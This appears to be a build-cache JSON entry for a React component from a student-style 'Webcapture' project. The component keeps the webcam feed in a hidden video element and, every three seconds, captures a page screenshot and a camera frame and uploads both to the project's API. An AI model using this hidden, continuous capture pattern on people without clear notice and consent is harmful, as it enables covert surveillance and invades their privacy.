{"ast":null,"code":"var _jsxFileName = \"D:\\\\Ashish\\\\2_1\\\\2_1_Project\\\\Actual_Project\\\\newdemo\\\\Webcapture_part\\\\client\\\\src\\\\components\\\\ImageCaptureComponent.jsx\",\n  _s = $RefreshSig$();\nimport React, { useEffect, useState, useRef } from 'react';\nimport html2canvas from 'html2canvas';\nimport { uploadImages } from '../services/api.js'; // Import your API function\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\nconst ImageCapture = () => {\n  _s();\n  const [screenshot, setScreenshot] = useState(null);\n  const [webcamImage, setWebcamImage] = useState(null);\n  const videoRef = useRef(null);\n\n  // Function to capture screenshot\n  const captureScreenshot = async () => {\n    const canvas = await html2canvas(document.body); // Capture the current view\n    canvas.toBlob(blob => setScreenshot(blob), 'image/png');\n  };\n\n  // Function to capture webcam image\n  const captureWebcamImage = () => {\n    if (videoRef.current) {\n      const canvas = document.createElement('canvas');\n      canvas.width = videoRef.current.videoWidth;\n      canvas.height = videoRef.current.videoHeight;\n      const ctx = canvas.getContext('2d');\n      ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);\n      canvas.toBlob(blob => setWebcamImage(blob), 'image/png');\n    }\n  };\n\n  // Upload images every 3 seconds\n  useEffect(() => {\n    const intervalId = setInterval(() => {\n      captureScreenshot();\n      captureWebcamImage();\n    }, 3000);\n    return () => clearInterval(intervalId);\n  }, []);\n\n  // Upload images when both are ready\n  useEffect(() => {\n    const upload = async () => {\n      if (screenshot && webcamImage) {\n        try {\n          await uploadImages(screenshot, webcamImage);\n          console.log('Images uploaded successfully');\n        } catch (error) {\n          console.error('Error uploading images:', error);\n        }\n      }\n    };\n    upload();\n  }, [screenshot, webcamImage]);\n\n  // Start webcam on component mount\n  useEffect(() => {\n    const startWebcam = async () => {\n      try {\n        const stream = await navigator.mediaDevices.getUserMedia({\n          video: true\n        });\n        if (videoRef.current) {\n          videoRef.current.srcObject = stream;\n        }\n      } catch (error) {\n        console.error('Error accessing webcam:', error);\n      }\n    };\n    startWebcam();\n  }, []);\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    children: [/*#__PURE__*/_jsxDEV(\"video\", {\n      ref: videoRef,\n      autoPlay: true,\n      style: {\n        display: 'none'\n      }\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 70,\n      columnNumber: 13\n    }, this), \" \"]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 69,\n    columnNumber: 9\n  }, this);\n};\n_s(ImageCapture, \"V6yttpd59xm5nxRIn4990RIJul4=\");\n_c = ImageCapture;\nexport default ImageCapture;\nvar _c;\n$RefreshReg$(_c, \"ImageCapture\");","map":{"version":3,"names":["React","useEffect","useState","useRef","html2canvas","uploadImages","jsxDEV","_jsxDEV","ImageCapture","_s","screenshot","setScreenshot","webcamImage","setWebcamImage","videoRef","captureScreenshot","canvas","document","body","toBlob","blob","captureWebcamImage","current","createElement","width","videoWidth","height","videoHeight","ctx","getContext","drawImage","intervalId","setInterval","clearInterval","upload","console","log","error","startWebcam","stream","navigator","mediaDevices","getUserMedia","video","srcObject","children","ref","autoPlay","style","display","fileName","_jsxFileName","lineNumber","columnNumber","_c","$RefreshReg$"],"sources":["D:/Ashish/2_1/2_1_Project/Actual_Project/newdemo/Webcapture_part/client/src/components/ImageCaptureComponent.jsx"],"sourcesContent":["import React, { useEffect, useState, useRef } from 'react';\r\nimport html2canvas from 'html2canvas';\r\nimport { uploadImages } from '../services/api.js';  // Import your API function\r\n\r\nconst ImageCapture = () => {\r\n    const [screenshot, setScreenshot] = useState(null);\r\n    const [webcamImage, setWebcamImage] = useState(null);\r\n    const videoRef = useRef(null);\r\n\r\n    // Function to capture screenshot\r\n    const captureScreenshot = async () => {\r\n        const canvas = await html2canvas(document.body);  // Capture the current view\r\n        canvas.toBlob(blob => setScreenshot(blob), 'image/png');\r\n    };\r\n\r\n    // Function to capture webcam image\r\n    const captureWebcamImage = () => {\r\n        if (videoRef.current) {\r\n            const canvas = document.createElement('canvas');\r\n            canvas.width = videoRef.current.videoWidth;\r\n            canvas.height = videoRef.current.videoHeight;\r\n            const ctx = canvas.getContext('2d');\r\n            ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);\r\n            canvas.toBlob(blob => setWebcamImage(blob), 'image/png');\r\n        }\r\n    };\r\n\r\n    // Upload images every 3 seconds\r\n    useEffect(() => {\r\n        const intervalId = setInterval(() => {\r\n            captureScreenshot();\r\n            captureWebcamImage();\r\n        }, 3000);\r\n\r\n        return () => clearInterval(intervalId);\r\n    }, []);\r\n\r\n    // Upload images when both are ready\r\n    useEffect(() => {\r\n        const upload = async () => {\r\n            if (screenshot && webcamImage) {\r\n                try {\r\n                    await uploadImages(screenshot, webcamImage);\r\n                    console.log('Images uploaded successfully');\r\n                } catch (error) {\r\n                    console.error('Error uploading images:', error);\r\n                }\r\n            }\r\n        };\r\n        upload();\r\n    }, [screenshot, webcamImage]);\r\n\r\n    // Start webcam on component mount\r\n    useEffect(() => {\r\n        const startWebcam = async () => {\r\n            try {\r\n                const stream = await navigator.mediaDevices.getUserMedia({ video: true });\r\n                if (videoRef.current) {\r\n                    videoRef.current.srcObject = stream;\r\n                }\r\n            } catch (error) {\r\n                console.error('Error accessing webcam:', error);\r\n            }\r\n        };\r\n        startWebcam();\r\n    }, []);\r\n\r\n    return (\r\n        <div>\r\n            <video ref={videoRef} autoPlay style={{ display: 'none' }} /> {/* Hidden video element */}\r\n        </div>\r\n    );\r\n};\r\n\r\nexport default ImageCapture;\r\n"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}